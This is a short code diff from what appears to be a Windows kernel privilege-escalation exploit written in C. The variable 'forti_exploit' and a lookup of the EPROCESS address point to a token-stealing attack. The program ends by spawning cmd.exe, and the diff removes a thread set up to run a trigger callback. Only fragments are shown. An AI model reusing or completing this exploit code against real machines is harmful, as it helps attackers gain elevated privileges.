@@ -378,21 +378,6 @@ int main()
 		return 1;
 	}
 
-	LPDWORD hThread_id = 0;
-	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&trigger_callback, NULL, CREATE_SUSPENDED, hThread_id);
-	if (hThread == NULL)
-	{
-		printf("[!] Error while calling CreateThread: %d\n", GetLastError());
-		return 1;
-	}
-
-	BOOL hThread_priority = SetThreadPriority(hThread, THREAD_PRIORITY_HIGHEST);
-	if (hThread_priority == 0)
-	{
-		printf("[!] Error while calling SetThreadPriority: %d\n", GetLastError());
-		return 1;
-	}
-
 	ULONGLONG eProcess;
 	const char* forti_exploit = "kstack.exe";
 	eProcess = GetEprocessAddress(forti_exploit);
@@ -531,4 +516,5 @@ int main()
 	system("start cmd.exe");
 
 	return 0;
+
 }
